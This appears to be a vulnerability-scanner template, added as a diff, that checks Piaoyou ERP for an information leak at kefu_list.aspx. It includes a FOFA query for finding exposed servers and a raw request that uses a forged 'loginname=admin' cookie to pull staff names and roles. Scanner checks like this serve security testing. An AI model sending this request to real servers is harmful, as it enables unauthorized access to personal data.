@@ -1,0 +1,32 @@
+id: piaoyou-erp-kefu_list-disclosure
+info:
+  name: 票友ERP系统kefu_list存在信息泄露
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/58464/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: (body="css/sexybuttons.css" && body="Ajax/confirm.ashx") || title="票友ERP"||body="tickets/intCity.css"
+    tips:
+    repair:
+    version:
+  tags: piaoyou,erp,disclosure
+
+http:
+  - raw:
+      - |
+        GET /json_db/kefu_list.aspx?stype=0&_search=false&nd=1751246532981&rows=25&page=1&sidx=id&sord=asc HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3029.68 Safari/537.36
+        Cookie: pyerpcookie=loginname=admin
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'truename','rolename')
+        condition: and
